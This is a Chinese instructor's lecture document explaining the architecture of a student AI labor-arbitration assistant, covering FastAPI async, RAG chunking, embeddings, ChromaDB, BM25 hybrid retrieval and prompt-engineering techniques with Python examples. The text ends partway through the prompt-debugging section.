# AI 劳动仲裁辅助系统 - 技术细节与难点讲解
> 当前版本更新说明（2026-06-27）：
> - 课堂主线以 `courseware/index.html` 和 `完整四天授课执行脚本.md` 为准。
> - 当前讲课顺序调整为：从零实现主线 → 四天逐日节奏 → 技术地图 → 答辩准备。
> - “从零实现”已补充前端最小页面路径：先静态、再 mock、再接接口。
> - Day4 中密码安全、第三方登录、接口限流作为扩展了解，不再作为学生必须完整实现的主任务。
> - 旧路径已统一迁移到当前骨架表达：`backend/app/plugin/module_ai/chat/*`、`backend/app/plugin/module_ai/knowledge/*`、`backend/app/core/*`。
> - 旧稿中较深的实现细节仅供讲师备课参考，课堂投屏优先使用网页课件。

> 本文档用于在 AI 生成项目时，详细讲解各个技术点的原理、实现细节、难点和解决方案

---

## 📋 目录

- [一、核心技术架构](#一核心技术架构)
- [二、RAG 检索增强生成](#二rag-检索增强生成)
- [三、向量数据库与 Embedding](#三向量数据库与-embedding)
- [四、检索边界技术](#四检索边界技术)
- [五、提示词工程](#五提示词工程)
- [六、WebSocket 流式响应](#六websocket-流式响应)
- [七、异步任务处理](#七异步任务处理)
- [八、JWT 身份认证](#八jwt-身份认证)
- [九、文件上传与解析](#九文件上传与解析)
- [十、性能优化策略](#十性能优化策略)

---

## 一、核心技术架构

### 1.1 技术栈选型原因

#### **为什么选择 FastAPI？**

```
传统 Flask 的问题：
❌ 同步阻塞（处理大量并发性能差）
❌ 没有原生类型提示支持
❌ 没有自动 API 文档

FastAPI 的优势：
✅ 原生异步支持（async/await）
✅ 自动类型验证（Pydantic）
✅ 自动生成 API 文档（Swagger UI）
✅ 性能接近 Go、Node.js
✅ 现代化开发体验
```

**关键代码示例**：
```python
# 同步方式（Flask）- 阻塞式
@app.route('/api/data')
def get_data():
    result = requests.get('external_api')  # 阻塞等待
    return jsonify(result)
# 问题：请求 A 在等待时，请求 B 无法处理

# 异步方式（FastAPI）- 非阻塞
@app.get('/api/data')
async def get_data():
    result = await httpx.get('external_api')  # 非阻塞
    return result
# 优势：请求 A 等待时，可以处理请求 B、C、D...
```

#### **为什么选择 uv 包管理器？**

```
对比传统工具：

pip：
- 依赖解析慢（纯 Python 实现）
- 安装速度慢（串行下载）
- 没有依赖锁定文件

poetry：
- 依赖解析慢
- 安装速度一般
- 有锁定文件（poetry.lock）

uv（我们选择的）：
✅ Rust 编写，极致性能
✅ 并行下载和安装
✅ 智能缓存（第二次秒装）
✅ 完全兼容 pip
✅ 自动管理虚拟环境
✅ 10-100 倍速度提升

实测：
pip install 150 个包 → 2-3 分钟
uv sync 150 个包 → 5-10 秒  ⚡
```

### 1.2 异步编程模型

#### **同步 vs 异步对比**

```python
# === 场景：同时处理 3 个用户请求，每个需要调用 LLM（2秒） ===

# 同步模型（总耗时 6 秒）
def handle_request(user_id):
    result = call_llm()  # 阻塞 2 秒
    return result

# 请求 A: 0s-2s
# 请求 B: 2s-4s（等待 A 完成）
# 请求 C: 4s-6s（等待 B 完成）
# 总耗时：6 秒

# 异步模型（总耗时 2 秒）
async def handle_request(user_id):
    result = await call_llm()  # 非阻塞 2 秒
    return result

# 请求 A: 0s-2s（发起调用，等待中）
# 请求 B: 0s-2s（同时发起，等待中）
# 请求 C: 0s-2s（同时发起，等待中）
# 总耗时：2 秒（并发处理）
```

**难点：何时使用 async/await**

```python
# 规则：I/O 操作使用异步，CPU 计算使用同步

# ✅ 异步场景（I/O 密集）
await llm.ainvoke(messages)        # 网络请求
await db.execute(query)            # 数据库查询
await file.read()                  # 文件读取
await websocket.send_text(data)    # 网络发送

# ❌ 不需要异步场景（CPU 密集）
result = json.loads(text)          # JSON 解析（快）
vector = embeddings.embed(text)    # 向量计算（需要等待）
text = extract_pdf(file)           # PDF 解析（CPU）

# ⚠️ 混合场景（正确写法）
async def process_data():
    # I/O 操作 - 异步
    raw_data = await fetch_api()
    
    # CPU 密集计算 - 放到线程池
    result = await asyncio.to_thread(heavy_computation, raw_data)
    
    # I/O 操作 - 异步
    await save_to_db(result)
```

---

## 二、RAG 检索增强生成

### 2.1 RAG 核心原理

#### **为什么需要 RAG？**

```
纯 LLM 的问题：

1. 知识截止日期
   问题：GPT-3.5 训练截止到 2021年9月
   后果：无法回答 2022-2024 年的新法律

2. 幻觉问题（Hallucination）
   问题：AI 会编造不存在的法条
   示例：
     用户："劳动合同法第 120 条是什么？"
     LLM："第 120 条规定了..." （实际只有 98 条）

3. 领域知识不足
   问题：通用模型对专业领域理解有限
   后果：回答空泛、不准确

RAG 的解决方案：

给 AI 提供"参考资料"，让它基于真实内容回答

流程：
用户提问 → 检索相关文档 → 把文档和问题一起发给 AI → AI 基于文档回答

优势：
✅ 答案有依据（来自真实文档）
✅ 知识可更新（更新文档即可）
✅ 可追溯来源（引用具体法条）
✅ 减少幻觉（限制 AI 发挥）
```

#### **RAG 完整流程图**

```
【离线阶段 - 构建知识库】
1. 准备文档
   ├─ 劳动合同法.txt (45 KB)
   ├─ 劳动争议调解仲裁法.txt (28 KB)
   └─ 工伤保险条例.txt (15 KB)
   
2. 文本切片（Chunking）
   原因：文档太长，超过 LLM 上下文窗口
   策略：chunk_size=700字，overlap=120字
   结果：3 个文档 → 156 个 chunks
   
3. 向量化（Embedding）
   原理：把文本转为 1536 维向量
   API：OpenAI text-embedding-3-small
   结果：156 个文本 → 156 个向量
   
4. 存储到向量数据库
   数据库：ChromaDB
   索引：HNSW 算法（近似最近邻搜索）

【在线阶段 - 检索和生成】
5. 用户提问
   示例："公司辞退孕妇合法吗？"
   
6. 问题向量化
   同样调用 Embedding API
   结果：查询文本 → 查询向量
   
7. 向量检索
   算法：余弦相似度计算
   召回：Top-4 最相关的 chunks
   结果：
     - 劳动合同法第 42 条（相似度 0.89）
     - 劳动合同法第 87 条（相似度 0.76）
     - ...
   
8. 构建 Prompt
   格式：
     系统提示词（角色定位）
     + 检索到的法条（参考资料）
     + 用户问题
   
9. 调用 LLM 生成
   模型：GPT-3.5-turbo
   温度：0.3（偏保守）
   
10. 返回答案
    内容：基于法条的专业回答
    引用：具体法条来源
```

### 2.2 文本切片（Chunking）难点

#### **为什么需要切片？**

```
LLM 上下文窗口限制：

GPT-3.5-turbo：4096 tokens（约 3000 汉字）
GPT-4：8192 tokens（约 6000 汉字）

劳动合同法全文：约 15000 汉字 → 无法一次性输入

解决：切成小块（chunks），只输入相关的几块
```

#### **切片参数选择**

```python
# 关键参数
chunk_size = 700      # 每块大小（字符数）
chunk_overlap = 120   # 重叠部分（字符数）

# 为什么是 700 字？
太小（300字）：
  ❌ 上下文不完整
  ❌ 法条被割裂
  ❌ 检索准确度降低

太大（1500字）：
  ❌ 语义稀释（一块包含多个主题）
  ❌ 检索不精确
  ❌ 浪费 token

700 字：
  ✅ 一般包含 1-3 个法条
  ✅ 上下文完整
  ✅ 语义集中

# 为什么需要重叠（overlap）？
避免关键信息被切断：

【无重叠】
Chunk 1: "...劳动者在本单位工作的年限"
Chunk 2: "每满一年支付一个月工资..."
问题：完整意思被割裂

【有重叠】
Chunk 1: "...劳动者在本单位工作的年限，每满一年支付..."
Chunk 2: "...工作的年限，每满一年支付一个月工资..."
优势：完整意思保留在至少一个 chunk 中
```

#### **切片实现细节**

```python
def split_text(text: str, chunk_size: int = 700, overlap: int = 120):
    """智能文本切片
    
    难点：
    1. 不能从句子中间切断
    2. 保持法条完整性
    3. 保留足够上下文
    """
    
    # 策略 1：按段落分割（优先）
    paragraphs = text.split('\n\n')
    
    chunks = []
    current_chunk = ""
    
    for para in paragraphs:
        # 如果段落本身太长，按句子切
        if len(para) > chunk_size:
            sentences = split_sentences(para)
            # 逐句添加，不超过 chunk_size
            for sent in sentences:
                if len(current_chunk) + len(sent) <= chunk_size:
                    current_chunk += sent
                else:
                    if current_chunk:
                        chunks.append(current_chunk)
                    current_chunk = sent
        else:
            # 段落可以完整保留
            if len(current_chunk) + len(para) <= chunk_size:
                current_chunk += para + '\n\n'
            else:
                if current_chunk:
                    chunks.append(current_chunk)
                current_chunk = para + '\n\n'
    
    # 最后一块
    if current_chunk:
        chunks.append(current_chunk)
    
    # 添加重叠
    final_chunks = []
    for i, chunk in enumerate(chunks):
        if i > 0:
            # 取上一块的最后 overlap 字符
            prefix = chunks[i-1][-overlap:]
            chunk = prefix + chunk
        final_chunks.append(chunk)
    
    return final_chunks
```

**测试切片效果**：
```python
# 示例文本
text = """
第四十七条 经济补偿按劳动者在本单位工作的年限，每满一年支付一个月工资的标准向劳动者支付。六个月以上不满一年的，按一年计算；不满六个月的，向劳动者支付半个月工资的经济补偿。

劳动者月工资高于用人单位所在直辖市、设区的市级人民政府公布的本地区上年度职工月平均工资三倍的，向其支付经济补偿的标准按职工月平均工资三倍的数额支付，向其支付经济补偿的年限最高不超过十二年。

本条所称月工资是指劳动者在劳动合同解除或者终止前十二个月的平均工资。
"""

chunks = split_text(text, chunk_size=150, overlap=30)
for i, chunk in enumerate(chunks):
    print(f"Chunk {i+1} ({len(chunk)} 字):")
    print(chunk)
    print("=" * 50)

# 输出分析：
# - 每块在 150 字左右
# - 法条没有被割裂
# - 有 30 字重叠保证连贯性
```

---

## 三、向量数据库与 Embedding

### 3.1 Embedding 原理

#### **什么是向量化？**

```
把文本转为数字向量，相似的文本向量也相似

示例（简化，实际是 1536 维）：
"劳动合同"     → [0.23, -0.45, 0.67, 0.12, -0.31]
"劳动协议"     → [0.25, -0.43, 0.65, 0.14, -0.29]  # 很接近！
"苹果手机"     → [-0.78, 0.32, -0.15, 0.89, 0.54]  # 完全不同

数学原理：
词嵌入（Word Embedding）→ 句子嵌入（Sentence Embedding）

Word2Vec / GloVe（早期）：
- 维度：300
- 只能单词级别

BERT / Sentence-BERT（中期）：
- 维度：768
- 可以句子级别
- 但速度慢

OpenAI Embedding（现在）：
- 维度：1536
- 质量高
- API 调用简单
```

#### **Embedding API 调用**

```python
from langchain_openai import OpenAIEmbeddings

embeddings = OpenAIEmbeddings(
    model="text-embedding-3-small",  # 模型选择
    api_key=settings.OPENAI_API_KEY
)

# 单个文本
text = "劳动合同法第42条"
vector = embeddings.embed_query(text)

print(f"维度: {len(vector)}")  # 1536
print(f"前5维: {vector[:5]}")  # [0.234, -0.456, ...]

# 批量文本（更高效）
texts = [
    "劳动合同法第42条",
    "经济补偿金计算",
    "工伤保险条例"
]
vectors = embeddings.embed_documents(texts)
print(f"向量数量: {len(vectors)}")  # 3
```

**关键问题：embed_query vs embed_documents**

```python
# 区别：

# embed_query - 用于查询
# - 单个文本
# - 可能有特殊处理（某些模型会加查询前缀）
query_vector = embeddings.embed_query("孕期能被辞退吗？")

# embed_documents - 用于文档
# - 批量文本
# - 并行处理，速度快
# - 用于构建知识库
doc_vectors = embeddings.embed_documents([
    "第42条：孕期不得解除",
    "第47条：经济补偿计算"
])

# 最佳实践：
# 1. 构建知识库时用 embed_documents（批量）
# 2. 用户查询时用 embed_query（单个）
```

### 3.2 向量相似度计算

#### **余弦相似度（Cosine Similarity）**

```python
# 数学公式
import numpy as np

def cosine_similarity(vec1, vec2):
    """计算两个向量的余弦相似度
    
    范围：-1 到 1
    - 1：完全相同
    - 0：无关
    - -1：完全相反
    """
    dot_product = np.dot(vec1, vec2)
    norm1 = np.linalg.norm(vec1)
    norm2 = np.linalg.norm(vec2)
    
    return dot_product / (norm1 * norm2)

# 示例
vec_query = [0.5, 0.3, -0.2]      # "孕期辞退"
vec_doc1 = [0.52, 0.31, -0.19]    # "孕期不得解除"
vec_doc2 = [-0.1, 0.8, 0.4]       # "经济补偿计算"

sim1 = cosine_similarity(vec_query, vec_doc1)
sim2 = cosine_similarity(vec_query, vec_doc2)

print(f"相似度1: {sim1:.3f}")  # 0.998（非常相似）
print(f"相似度2: {sim2:.3f}")  # 0.123（不相关）
```

**为什么用余弦相似度而不是欧氏距离？**

```
欧氏距离（Euclidean Distance）：
- 计算两点之间的直线距离
- 受向量长度影响

问题：
"劳动合同法" → 长向量
"劳动合同法劳动合同法" → 更长的向量（重复内容）
欧氏距离会认为它们很不同（实际语义相同）

余弦相似度：
- 只关注方向，不关注长度
- 更符合语义相似度的定义

结论：文本相似度使用余弦相似度
```

### 3.3 ChromaDB 核心机制

#### **为什么选择 ChromaDB？**

```
向量数据库对比：

Pinecone（云服务）：
✅ 性能强
✅ 支持大规模
❌ 需要付费
❌ 数据在云端

Milvus（自建）：
✅ 开源
✅ 高性能
❌ 部署复杂（需要 Docker）
❌ 资源占用大

ChromaDB（我们的选择）：
✅ 嵌入式（pip install 即可）
✅ 轻量级（适合中小规模）
✅ 开发友好
✅ 持久化到本地
✅ 完全免费

适用场景：
- 文档数量：< 100 万
- 向量维度：1536
- 查询 QPS：< 100
```

#### **ChromaDB 索引算法：HNSW**

```
HNSW = Hierarchical Navigable Small World

传统暴力搜索：
- 计算查询向量与所有文档向量的相似度
- 排序，返回 Top-K
- 时间复杂度：O(N)
- 问题：文档多时很慢（10万文档 → 几秒）

HNSW 算法：
- 构建多层图结构
- 从粗粒度到细粒度逐层搜索
- 时间复杂度：O(log N)
- 速度：10万文档 → 几毫秒

图解：
层2: [ A ] ---------- [ B ]
      |               |
层1: [ A - C - D ]   [ B - E - F ]
      |   |   |       |   |   |
层0: [ A-C-D-G-H ]   [ B-E-F-I-J ]

查询流程：
1. 从顶层开始
2. 找到最近的节点
3. 下降到下一层
4. 重复直到底层
5. 返回最近的 K 个节点

精度 vs 速度：
- 不是精确搜索（99% 准确率）
- 速度极快（毫秒级）
- 可接受的权衡
```

#### **ChromaDB 使用细节**

```python
import chromadb
from chromadb.config import Settings

# 创建持久化客户端
client = chromadb.PersistentClient(
    path="./data/chroma_db",
    settings=Settings(
        anonymized_telemetry=False,  # 关闭遥测
        allow_reset=True
    )
)

# 创建 collection（集合）
collection = client.get_or_create_collection(
    name="legal_knowledge",
    metadata={
        "hnsw:space": "cosine",      # 相似度算法
        "hnsw:construction_ef": 100,  # 构建参数
        "hnsw:M": 16                  # 连接数
    }
)

# 添加文档
collection.add(
    documents=[
        "第42条：孕期不得解除劳动合同",
        "第47条：经济补偿按工作年限计算"
    ],
    embeddings=[
        [0.1, 0.2, ...],  # 1536维向量
        [0.3, 0.4, ...]
    ],
    ids=["doc_1", "doc_2"],
    metadatas=[
        {"source": "劳动合同法", "article": "42"},
        {"source": "劳动合同法", "article": "47"}
    ]
)

# 查询
results = collection.query(
    query_embeddings=[[0.15, 0.25, ...]],  # 查询向量
    n_results=5,                            # 返回前5个
    include=["documents", "distances", "metadatas"]
)

print(results)
# {
#   'ids': [['doc_1', 'doc_2']],
#   'distances': [[0.05, 0.32]],  # 越小越相似
#   'documents': [['第42条...', '第47条...']],
#   'metadatas': [[{...}, {...}]]
# }
```

**重要参数说明**：

```python
# hnsw:M（连接数）
M = 16  # 默认
# - 越大：准确率越高，内存占用越大
# - 越小：速度越快，准确率下降
# 建议：16-32

# hnsw:construction_ef（构建时的搜索深度）
construction_ef = 100  # 默认
# - 越大：索引质量越高，构建越慢
# - 建议：100-200

# hnsw:search_ef（查询时的搜索深度）
search_ef = 10  # 默认
# - 越大：准确率越高，查询越慢
# - 建议：10-50
```

---

## 四、检索边界技术

### 4.1 为什么需要检索边界？

#### **单一检索的局限性**

```
场景测试：

查询 1："第47条怎么规定的？"
- 纯向量检索：可能匹配到第42条、第87条（语义相关但不精确）
- BM25检索：精确匹配"第47条"或"四十七条"
- 结论：BM25 更好 ✓

查询 2："公司辞退孕妇合法吗？"
- 纯向量检索：能理解"辞退"="解除劳动合同"
- BM25检索：只匹配"辞退"字面，漏掉"解除劳动合同"
- 结论：向量检索更好 ✓

查询 3："女职工 孕期 产期 哺乳期 解除"（关键词密集）
- 纯向量检索：语义被稀释，不够精确
- BM25检索：多个关键词都匹配，分数高
- 结论：BM25 更好 ✓

总结：没有一种方法适用所有场景 → 需要混合
```

### 4.2 BM25 算法详解

#### **BM25 核心公式**

```
BM25 = Best Matching 25（TF-IDF 的改进版）

公式（简化）：
Score(D, Q) = Σ IDF(qi) × (TF(qi, D) × (k1 + 1)) / (TF(qi, D) + k1 × (1 - b + b × |D| / avgDL))

其中：
- Q：查询（包含多个词 qi）
- D：文档
- TF(qi, D)：词 qi 在文档 D 中的频率
- IDF(qi)：逆文档频率（词的稀有程度）
- |D|：文档长度
- avgDL：平均文档长度
- k1、b：调参参数

通俗解释：

1. IDF（逆文档频率）
   - 常见词（"的"、"是"）→ 权重低
   - 稀有词（"孕期"、"解除"）→ 权重高
   
   公式：IDF = log((N - n + 0.5) / (n + 0.5))
   N：总文档数
   n：包含该词的文档数

2. TF（词频）
   - 词出现越多，分数越高
   - 但有上限（避免恶意堆砌关键词）
   
   归一化：TF / (TF + k1)
   不归一化：随着 TF 增加，分数无限增长
   归一化后：最多到 1/(1+k1)，有上限

3. 文档长度归一化
   - 长文档容易包含更多关键词
   - 需要惩罚长文档
   
   因子：1 - b + b × |D| / avgDL
   b=0：不考虑长度
   b=1：完全归一化
   通常 b=0.75
```

#### **BM25 实现**

```python
from rank_bm25 import BM25Okapi
import jieba

# 准备文档（需要分词）
documents = [
    "劳动合同法第42条规定女职工在孕期产期哺乳期不得解除劳动合同",
    "劳动合同法第47条规定经济补偿按劳动者工作年限计算每满一年支付一个月工资",
    "劳动合同法第87条规定违法解除劳动合同应当支付赔偿金按经济补偿标准二倍支付"
]

# 中文分词
tokenized_docs = []
for doc in documents:
    tokens = list(jieba.cut(doc))
    # 过滤停用词和单字
    tokens = [t for t in tokens if len(t) > 1 and t not in STOPWORDS]
    tokenized_docs.append(tokens)

print(tokenized_docs[0])
# ['劳动合同法', '42', '规定', '女职工', '孕期', '产期', '哺乳期', '不得', '解除', '劳动合同']

# 创建 BM25 索引
bm25 = BM25Okapi(
    tokenized_docs,
    k1=1.5,  # 词频饱和参数
    b=0.75   # 长度归一化参数
)

# 查询
query = "孕期可以解除劳动合同吗"
query_tokens = list(jieba.cut(query))
query_tokens = [t for t in query_tokens if len(t) > 1]

# 获取所有文档的分数
scores = bm25.get_scores(query_tokens)
print(scores)
# [2.15, 0.31, 0.85]  ← 第1个文档分数最高

# 获取 Top-K
top_docs = bm25.get_top_n(query_tokens, documents, n=2)
for i, doc in enumerate(top_docs):
    print(f"{i+1}. {doc}")
```

**关键参数调优**：

```python
# k1：词频饱和参数（默认 1.5）
k1 = 1.5
# - 越大：词频的影响越大
# - 越小：词频的影响越小
# 建议：1.2 - 2.0

# b：长度归一化参数（默认 0.75）
b = 0.75
# - 0：不考虑文档长度
# - 1：完全归一化
# 建议：0.75（标准值）

# 实验对比
bm25_strict = BM25Okapi(docs, k1=2.0, b=0.9)   # 严格（精确匹配）
bm25_loose = BM25Okapi(docs, k1=1.0, b=0.5)    # 宽松（语义理解）
```

### 4.3 检索边界策略

#### **召回阶段**

```python
def hybrid_search(query: str, top_k: int = 4):
    """检索边界
    
    策略：
    1. 向量检索召回 Top-12
    2. BM25 检索召回 Top-12
    3. 结果排序融合
    4. 返回 Top-K
    """
    
    # === 阶段 1：向量检索 ===
    vector_results = vector_search(query, top_k=12)
    # 返回：[
    #   RetrievedChunk(id="v1", score=0.89, text="..."),
    #   RetrievedChunk(id="v2", score=0.76, text="..."),
    #   ...
    # ]
    
    # === 阶段 2：BM25 检索 ===
    bm25_results = bm25_search(query, top_k=12)
    # 返回：[
    #   RetrievedChunk(id="b1", score=2.15, text="..."),
    #   RetrievedChunk(id="b2", score=1.32, text="..."),
    #   ...
    # ]
    
    # === 阶段 3：结果排序融合 ===
    final_results = rerank(vector_results, bm25_results, top_k=top_k)
    
    return final_results
```

#### **结果排序算法**

```python
def rerank(vector_results, bm25_results, top_k=4):
    """结果排序融合
    
    难点：
    1. 两种分数量纲不同（向量0-1，BM25 0-10+）
    2. 需要归一化
    3. 需要合理加权
    """
    
    # === 步骤 1：分数归一化（MinMax）===
    def normalize_scores(scores):
        if not scores or max(scores) == min(scores):
            return [0.5] * len(scores)
        min_s, max_s = min(scores), max(scores)
        return [(s - min_s) / (max_s - min_s) for s in scores]
    
    vector_scores_norm = normalize_scores([r.score for r in vector_results])
    bm25_scores_norm = normalize_scores([r.score for r in bm25_results])
    
    # === 步骤 2：构建文档分数字典 ===
    doc_scores = {}
    
    # 向量检索结果
    for i, result in enumerate(vector_results):
        doc_id = result.chunk_id
        doc_scores[doc_id] = {
            'chunk': result,
            'vector_score': vector_scores_norm[i],
            'bm25_score': 0.0
        }
    
    # BM25 检索结果
    for i, result in enumerate(bm25_results):
        doc_id = result.chunk_id
        if doc_id in doc_scores:
            doc_scores[doc_id]['bm25_score'] = bm25_scores_norm[i]
        else:
            doc_scores[doc_id] = {
                'chunk': result,
                'vector_score': 0.0,
                'bm25_score': bm25_scores_norm[i]
            }
    
    # === 步骤 3：计算融合分数 ===
    alpha = 0.7  # 向量权重
    beta = 0.3   # BM25 权重
    
    for doc_id, scores in doc_scores.items():
        scores['combined_score'] = (
            alpha * scores['vector_score'] +
            beta * scores['bm25_score']
        )
    
    # === 步骤 4：业务规则加分 ===
    for doc_id, scores in doc_scores.items():
        chunk_text = scores['chunk'].text
        
        # 规则1：法条引用加分
        if has_article_reference(chunk_text):
            scores['combined_score'] += 0.2
        
        # 规则2：来源权重
        source = scores['chunk'].source_name
        source_weight = SOURCE_WEIGHTS.get(source, 1.0)
        scores['combined_score'] *= source_weight
    
    # === 步骤 5：排序返回 ===
    sorted_docs = sorted(
        doc_scores.items(),
        key=lambda x: x[1]['combined_score'],
        reverse=True
    )
    
    final_results = []
    for doc_id, scores in sorted_docs[:top_k]:
        chunk = scores['chunk']
        chunk.score = scores['combined_score']
        final_results.append(chunk)
    
    return final_results
```

**权重调优策略**：

```python
# 方案1：固定权重（简单）
alpha, beta = 0.7, 0.3

# 方案2：根据查询类型动态调整
def get_weights(query):
    # 检测查询类型
    if re.search(r'第\d+条', query):
        # 包含法条号 → 偏向 BM25
        return 0.4, 0.6
    elif len(query) < 10:
        # 短查询 → 偏向 BM25
        return 0.5, 0.5
    else:
        # 长查询 → 偏向向量
        return 0.7, 0.3

# 方案3：学习权重（复杂，需要标注数据）
# 使用机器学习模型学习最优权重
# 需要人工标注：查询 → 相关文档
```

---

## 五、提示词工程

### 5.1 提示词设计原则

#### **七要素框架**

```
1. 角色定位（Role）
   为什么：让 AI 进入专业状态
   示例：
     ❌ "回答这个问题"
     ✅ "你是一位拥有10年经验的资深劳动法律师"

2. 任务描述（Task）
   为什么：明确要做什么
   示例：
     ❌ "分析案件"
     ✅ "分析劳动纠纷案件并给出维权建议"

3. 输入数据（Input）
   为什么：提供必要信息
   示例：
     - 案件描述
     - 用户信息（职位、工作年限、工资）
     - 证据清单

4. 输出格式（Output Format）
   为什么：结构化输出，便于解析
   示例：
     ❌ "给我分析结果"
     ✅ "输出JSON：{\"rights_claim\": \"...\", \"case_summary\": \"...\"}"

5. 示例引导（Examples）
   为什么：Few-shot learning，提高准确率
   示例：
     输入：公司辞退我
     输出：{\"rights_claim\": \"要求支付违法解除赔偿金\", ...}

6. 约束条件（Constraints）
   为什么：限制 AI 发挥，减少幻觉
   示例：
     - "仅基于提供的法律条文回答"
     - "不要编造法条"
     - "建议必须具体可操作"

7. 语气风格（Tone）
   为什么：符合场景
   示例：
     - 法律咨询：专业、严谨
     - 客服：友好、耐心
```

#### **实际案例：诉求分析提示词**

```python
CLAIM_ANALYSIS_PROMPT = """
# 角色定位
你是一位资深劳动法律师，拥有10年劳动纠纷案件处理经验。

# 任务
从用户提供的案情描述中，提取以下信息：
1. 权利主张：用户想要什么赔偿/结果
2. 案件摘要：核心事实 + 举证要点

# 输入数据
案情描述：
{content}

# 输出格式（JSON）
{{
  "rights_claim": string,    // 权利主张，例如"要求支付违法解除赔偿金80,000元"
  "case_summary": string     // 案件摘要，200-300字
}}

# 示例
输入：
"我在公司工作5年，月薪8000元。上个月告诉公司我怀孕了，这个月公司说我业绩不好把我辞退了，没有任何赔偿。"

输出：
{{
  "rights_claim": "要求公司支付违法解除劳动合同赔偿金80,000元（月薪8000×5年×2倍）",
  "case_summary": "劳动者在单位工作满5年，月薪8000元。怀孕后告知公司，次月被以"业绩不好"为由辞退，未支付补偿。核心争议：1）公司是否构成违法解除（孕期保护）；2）赔偿金计算标准。举证要点：①劳动合同证明工作年限②工资流水证明月薪③孕检报告证明怀孕事实④解除通知证明辞退理由。"
}}

# 约束条件
1. 仅返回JSON对象，第一个字符是{{，最后一个字符是}}
2. 不要输出任何解释、markdown 或其他文本
3. rights_claim 必须具体，包含金额（如果可计算）
4. case_summary 必须包含：劳动者基本信息、事件经过、核心争议、举证要点
5. 如果信息不足，在 case_summary 中说明"需要补充XXX证据"

# 语气
专业、客观、精确
"""
```

### 5.2 提示词优化技巧

#### **技巧1：强制结构化输出**

```python
# 问题：AI 经常输出非 JSON 格式
错误输出1：
```json
{"rights_claim": "..."}
```

错误输出2：
让我来分析一下这个案件...
{"rights_claim": "..."}

错误输出3：
{
  // 这是权利主张
  "rights_claim": "..."
}

# 解决方案：在提示词中强调
约束条件：
1. 仅返回一个JSON对象，不输出markdown
2. 第一个字符必须是 {
3. 最后一个字符必须是 }
4. 不要包含注释
5. 不要输出任何解释文字

# 进一步优化：使用 JSON Schema
from langchain_core.output_parsers import JsonOutputParser
from pydantic import BaseModel, Field

class ClaimAnalysisOutput(BaseModel):
    rights_claim: str = Field(description="权利主张")
    case_summary: str = Field(description="案件摘要")

parser = JsonOutputParser(pydantic_object=ClaimAnalysisOutput)

# 在提示词中添加格式说明
format_instructions = parser.get_format_instructions()
prompt = f"""
{CLAIM_ANALYSIS_PROMPT}

输出格式：
{format_instructions}
"""
```

#### **技巧2：Few-shot Learning（少样本学习）**

```python
# 零样本（Zero-shot）- 效果一般
prompt = """
分析以下案件并提取权利主张。

案件：{content}
"""

# 单样本（One-shot）- 效果较好
prompt = """
分析以下案件并提取权利主张。

示例：
输入：公司辞退我，没给补偿
输出：{"rights_claim": "要求支付经济补偿金"}

案件：{content}
"""

# 多样本（Few-shot）- 效果最好
prompt = """
分析以下案件并提取权利主张。

示例1：
输入：公司辞退我，没给补偿，我工作了3年
输出：{"rights_claim": "要求支付违法解除赔偿金（3个月工资×2倍）"}

示例2：
输入：公司拖欠我2个月工资，每月5000元
输出：{"rights_claim": "要求支付拖欠工资10,000元及25%经济补偿金"}

示例3：
输入：怀孕后被辞退
输出：{"rights_claim": "要求撤销违法解除决定，恢复劳动关系或支付赔偿金"}

案件：{content}
"""

# 最佳实践：
# - 3-5 个示例最佳
# - 示例要有代表性（覆盖常见场景）
# - 示例要多样化（不同类型）
```

#### **技巧3：Chain of Thought（思维链）**

```python
# 普通提示词
prompt = """
计算经济补偿金。

工作年限：5年
月工资：8000元
"""
# AI 输出：40,000元
# 问题：不知道怎么算的

# 思维链提示词
prompt = """
计算经济补偿金，并展示计算过程。

工作年限：5年
月工资：8000元

请按照以下步骤：
1. 确定适用法条
2. 确定计算公式
3. 代入数据计算
4. 给出最终结果

输出格式：
{
  "applicable_law": "劳动合同法第47条",
  "formula": "工作年限 × 月工资",
  "calculation": "5 × 8000 = 40000",
  "result": "40,000元"
}
"""
# 优势：可验证、可追溯、更准确
```

#### **技巧4：Self-Consistency（自我一致性）**

```python
# 对于重要决策，多次调用取一致结果

async def analyze_with_consistency(content: str, n: int = 3):
    """多次分析取一致结果
    
    Args:
        content: 案情描述
        n: 调用次数
    """
    results = []
    
    for i in range(n):
        result = await analyze_claim(content)
        results.append(result)
    
    # 投票：取出现最多的结果
    from collections import Counter
    
    claims = [r['rights_claim'] for r in results]
    most_common_claim = Counter(claims).most_common(1)[0][0]
    
    return most_common_claim

# 使用场景：
# - 胜诉概率评估（重要决策）
# - 赔偿金额计算（需要准确）
# - 不用于：简单问答（浪费token）
```

#### **技巧5：温度（Temperature）调节**

```python
# 温度控制随机性

# temperature = 0.0 - 确定性输出
llm = ChatOpenAI(model="gpt-3.5-turbo", temperature=0.0)
# 适用：
# - 数据提取
# - JSON 输出
# - 计算任务

# temperature = 0.3 - 稍有创造性（推荐）
llm = ChatOpenAI(model="gpt-3.5-turbo", temperature=0.3)
# 适用：
# - 法律咨询
# - 案件分析
# - 文书生成

# temperature = 0.7 - 平衡
llm = ChatOpenAI(model="gpt-3.5-turbo", temperature=0.7)
# 适用：
# - 创意写作
# - 聊天对话

# temperature = 1.0+ - 高创造性
llm = ChatOpenAI(model="gpt-3.5-turbo", temperature=1.2)
# 适用：
# - 头脑风暴
# - 故事创作
# 不适用本项目（需要准确性）

# 本项目推荐值
TEMPERATURE_MAP = {
    "数据提取": 0.0,
    "案件分析": 0.3,
    "法律咨询": 0.3,
    "文书生成": 0.2,
    "对话聊天": 0.7
}
```

### 5.3 提示词调试技巧

```python
# 技巧1：打印完整 Prompt
def debug_prompt(messages):
    print("=" * 60)
    print("完整 Prompt:")
    print("=" * 60)
    for msg in messages:
        print(f"[{msg.__class__.__name__}]")
        print(msg.content)
        print("-" * 60)
    print()

# 使用
messages = [
    SystemMessage(content=SYSTEM_PROMPT),
    HumanMessage(content=user_query)
]
debug_prompt(messages)
response = await llm.ainvoke(messages)

# 技巧2：记录 Token 使用
from langchain.callbacks import get_openai_callback

with get_openai_callback() as cb:
    response = await llm.ainvoke(messages)
    print(f"总 tokens: {cb.total_tokens}")
    print(f"提示 tokens: {cb.prompt_tokens}")
    print(f"完成 tokens: {cb.completion_tokens}")
    print(f"总成本: ${cb.total_cost:.4f}")

# 技巧3：AB 测试
async def ab_test_prompts(query, prompt_a, prompt_b):
    """对比两个提示词效果"""
    
    # 版本 A
    result_a = await call_llm(prompt_a.format(query=query))
    
    # 版本 B
    result_b = await call_llm(prompt_b.format(query=query))
    
    print("版本 A 输出:")
    print(result_a)
    print("\n版本 B 输出:")
    print(result_b)
    
    # 人工评估或自动评估
